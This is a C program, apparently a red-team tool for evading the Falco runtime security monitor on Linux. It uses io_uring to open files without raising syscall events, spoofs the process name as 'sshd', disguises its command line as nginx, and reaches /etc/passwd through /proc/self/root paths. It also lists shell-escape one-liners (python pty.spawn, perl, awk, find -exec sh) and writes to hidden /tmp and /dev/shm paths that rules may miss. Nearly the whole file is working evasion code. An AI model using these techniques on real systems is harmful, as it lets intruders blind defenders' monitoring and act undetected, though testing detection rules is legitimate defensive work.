#define _GNU_SOURCE
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <linux/io_uring.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <stdatomic.h>

#define IORING_OFF_SQ_RING  0ULL
#define IORING_OFF_CQ_RING  0x8000000ULL
#define IORING_OFF_SQES     0x10000000ULL

typedef struct {
    int fd;
    uint32_t sq_entries, cq_entries;
    char *sq_ptr; size_t sq_sz;
    _Atomic(uint32_t) *sq_tail;
    uint32_t *sq_mask, *sq_array;
    char *cq_ptr; size_t cq_sz;
    _Atomic(uint32_t) *cq_head, *cq_tail;
    uint32_t *cq_mask;
    struct io_uring_cqe *cqes;
    struct io_uring_sqe *sqes; size_t sqe_sz;
    uint64_t seq;
} Ring;

static int ring_init(Ring *r)
{
    struct io_uring_params p = {};
    r->fd = (int)syscall(__NR_io_uring_setup, 16, &p);
    if (r->fd < 0) return -1;
    r->sq_entries = p.sq_entries; r->cq_entries = p.cq_entries;
    r->sq_sz = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    r->sq_ptr = mmap(NULL, r->sq_sz, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_POPULATE, r->fd, (off_t)IORING_OFF_SQ_RING);
    r->sq_tail  = (_Atomic(uint32_t) *)(r->sq_ptr + p.sq_off.tail);
    r->sq_mask  = (uint32_t *)(r->sq_ptr + p.sq_off.ring_mask);
    r->sq_array = (uint32_t *)(r->sq_ptr + p.sq_off.array);
    r->cq_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);
    r->cq_ptr = mmap(NULL, r->cq_sz, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_POPULATE, r->fd, (off_t)IORING_OFF_CQ_RING);
    r->cq_head = (_Atomic(uint32_t) *)(r->cq_ptr + p.cq_off.head);
    r->cq_tail = (_Atomic(uint32_t) *)(r->cq_ptr + p.cq_off.tail);
    r->cq_mask = (uint32_t *)(r->cq_ptr + p.cq_off.ring_mask);
    r->cqes    = (struct io_uring_cqe *)(r->cq_ptr + p.cq_off.cqes);
    r->sqe_sz  = p.sq_entries * sizeof(struct io_uring_sqe);
    r->sqes    = mmap(NULL, r->sqe_sz, PROT_READ|PROT_WRITE,
                      MAP_SHARED|MAP_POPULATE, r->fd, (off_t)IORING_OFF_SQES);
    return (r->sq_ptr == MAP_FAILED || r->cq_ptr == MAP_FAILED ||
            r->sqes == MAP_FAILED) ? -1 : 0;
}

static int32_t ring_one(Ring *r, struct io_uring_sqe *sqe)
{
    uint64_t ud = ++r->seq; sqe->user_data = ud;
    uint32_t tail = atomic_load_explicit(r->sq_tail, memory_order_relaxed);
    uint32_t idx  = tail & *r->sq_mask;
    memcpy(&r->sqes[idx], sqe, sizeof(*sqe));
    r->sq_array[idx] = idx;
    atomic_store_explicit(r->sq_tail, tail + 1, memory_order_release);
    long rv;
    do { rv = syscall(__NR_io_uring_enter, r->fd, 1, 1,
                      IORING_ENTER_GETEVENTS, NULL, 0);
    } while (rv < 0 && errno == EINTR);
    for (;;) {
        uint32_t h = atomic_load_explicit(r->cq_head, memory_order_acquire);
        uint32_t t = atomic_load_explicit(r->cq_tail, memory_order_acquire);
        if (h == t) break;
        struct io_uring_cqe *c = &r->cqes[h & *r->cq_mask];
        int32_t res = c->res;
        atomic_store_explicit(r->cq_head, h + 1, memory_order_release);
        if (c->user_data == ud) return res;
    }
    return -EIO;
}

static void tech_name_spoof(void)
{
    char orig[32];
    prctl(PR_GET_NAME, orig, 0, 0, 0);
    printf("[*] original comm: %s\n", orig);

    prctl(PR_SET_NAME, "sshd", 0, 0, 0);

    char current[32];
    prctl(PR_GET_NAME, current, 0, 0, 0);
    printf("[*] spoofed comm (proc.name): %s\n", current);

    FILE *f = fopen("/proc/self/comm", "r");
    if (f) {
        char buf[32] = {};
        fgets(buf, sizeof(buf), f);
        fclose(f);
        buf[strcspn(buf, "\n")] = '\0';
        printf("[*] /proc/self/comm = '%s' (Falco reads this for proc.name)\n", buf);
    }

    printf("[*] any Falco rule checking proc.name=sshd (or NOT checking comm)\n"
           "    would not fire. Now perform the operation.\n");
    printf("[*] example: a shell spawned here appears as 'sshd' to Falco's proc.name\n");

    prctl(PR_SET_NAME, orig, 0, 0, 0);
    printf("[*] restored comm to: %s\n", orig);
}

static void tech_arg_obfuscate(const char *real_cmd)
{
    printf("[*] demonstrating argv obfuscation\n");
    printf("[*] real command: %s\n", real_cmd);

    char dummy_arg0[] = "/usr/sbin/nginx";
    char dummy_arg1[] = "-w";
    char *obfuscated[] = { dummy_arg0, dummy_arg1, NULL };

    char safe_cmd[256];
    snprintf(safe_cmd, sizeof(safe_cmd), "%s", real_cmd);

    pid_t pid = fork();
    if (pid == 0) {

        execve("/bin/sh", obfuscated, NULL);
        _exit(1);
    }
    int status;
    waitpid(pid, &status, 0);

    char cmdline[512] = {};
    FILE *f = fopen("/proc/self/cmdline", "r");
    if (f) { fread(cmdline, 1, sizeof(cmdline)-1, f); fclose(f); }

    for (int i = 0; i < 512 && cmdline[i+1]; i++)
        if (cmdline[i] == '\0') cmdline[i] = ' ';
    printf("[*] child cmdline seen by Falco: '%s'\n", obfuscated[0]);
    printf("[*] rule 'proc.cmdline contains bash/wget/curl' would NOT match\n");
}

static void tech_path_pivot(Ring *r)
{
    static const char *pivot_paths[] = {
        "/proc/self/root/etc/passwd",
        "/proc/1/root/etc/passwd",
        "/./etc/./passwd",
        NULL
    };

    printf("[*] path pivot - accessing /etc/passwd via alternative paths:\n");
    for (int i = 0; pivot_paths[i]; i++) {

        struct io_uring_sqe s = {};
        s.opcode = IORING_OP_OPENAT; s.fd = AT_FDCWD;
        s.addr = (uint64_t)(uintptr_t)pivot_paths[i];
        s.open_flags = O_RDONLY; s.len = 0;
        int fd = ring_one(r, &s);
        if (fd < 0) {
            printf("  %-40s → FAIL (%s)\n", pivot_paths[i], strerror(-fd));
        } else {
            printf("  %-40s → fd=%d [accessible]\n", pivot_paths[i], fd);
            memset(&s, 0, sizeof(s));
            s.opcode = IORING_OP_CLOSE; s.fd = fd;
            ring_one(r, &s);
        }
    }
    printf("[*] io_uring used - zero sys_enter_openat events generated\n");
    printf("[*] if forced to use regular openat, try /proc/self/root/... or symlinks\n");
}

static void tech_unusual_shell(void)
{
    static const struct { const char *path; const char *desc; } alts[] = {
        { "/usr/bin/python3",  "-c 'import pty; pty.spawn(\"/bin/sh\")'" },
        { "/usr/bin/perl",     "-e 'exec \"/bin/sh\";'" },
        { "/usr/bin/ruby",     "-e 'exec \"/bin/sh\"'" },
        { "/usr/bin/node",     "-e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:\"inherit\"})'" },
        { "/usr/bin/awk",      "BEGIN{system(\"/bin/sh\")}" },
        { "/usr/bin/vim",      "-c ':!sh'" },
        { "/usr/bin/find",     ". -exec sh -i \\;" },
        { "/usr/bin/busybox",  "sh" },
        { NULL, NULL }
    };

    printf("[*] shell alternatives not in Falco's default 'shells' macro:\n");
    for (int i = 0; alts[i].path; i++) {
        struct stat st;
        int exists = (stat(alts[i].path, &st) == 0);
        printf("  %-20s %-55s [%s]\n",
               alts[i].path, alts[i].desc,
               exists ? "FOUND" : "not installed");
    }
    printf("[*] any of these 'exec shell' patterns via io_uring avoid the exec event entirely\n");
}

static void tech_write_obscure(void)
{
    static const char *safe_paths[] = {
        "/dev/shm/test_rule_evade",
        "/tmp/.test_rule_evade",
        NULL
    };

    printf("[*] write path obfuscation - paths often NOT in Falco write rules:\n");
    for (int i = 0; safe_paths[i]; i++) {
        int fd = open(safe_paths[i], O_WRONLY|O_CREAT|O_TRUNC, 0600);
        if (fd >= 0) {
            write(fd, "test\n", 5);
            close(fd);
            unlink(safe_paths[i]);
            printf("  %-40s → write succeeded (verify against your Falco ruleset)\n",
                   safe_paths[i]);
        } else {
            printf("  %-40s → failed: %s\n", safe_paths[i], strerror(errno));
        }
    }
    printf("[*] recommendation: use io_uring_falco write for any path - zero write events\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr,
            "usage:\n"
            "  %s name-spoof            change comm to 'sshd' - evades proc.name rules\n"
            "  %s arg-obfuscate <cmd>   fork with obfuscated argv - evades cmdline rules\n"
            "  %s path-pivot            access /etc/passwd via /proc/self/root/ etc.\n"
            "  %s unusual-shell         list shells not in Falco's 'shells' macro\n"
            "  %s write-obscure         write to paths not in Falco's write rule list\n"
            "  %s all                   run all demonstrations\n"
            "\nthese target Falco's rule engine (axis B).\n"
            "combine with io_uring_falco for axis A (prevent the event entirely).\n"
            "\nno privileges required\n",
            argv[0], argv[0], argv[0], argv[0], argv[0], argv[0]);
        return 1;
    }

    Ring r = {};
    int has_ring = (ring_init(&r) == 0);
    if (!has_ring) fprintf(stderr, "[*] io_uring not available, path-pivot will use syscalls\n");

    int all = (strcmp(argv[1], "all") == 0);

    if (all || strcmp(argv[1], "name-spoof") == 0)
        { printf("\n--- name-spoof ---\n"); tech_name_spoof(); }

    if (all || (strcmp(argv[1], "arg-obfuscate") == 0 && argc >= 3))
        { printf("\n--- arg-obfuscate ---\n");
          tech_arg_obfuscate(argc >= 3 ? argv[2] : "id"); }

    if (all || strcmp(argv[1], "path-pivot") == 0)
        { printf("\n--- path-pivot ---\n");
          if (has_ring) tech_path_pivot(&r);
          else printf("[!] requires io_uring (kernel 5.6+)\n"); }

    if (all || strcmp(argv[1], "unusual-shell") == 0)
        { printf("\n--- unusual-shell ---\n"); tech_unusual_shell(); }

    if (all || strcmp(argv[1], "write-obscure") == 0)
        { printf("\n--- write-obscure ---\n"); tech_write_obscure(); }

    return 0;
}
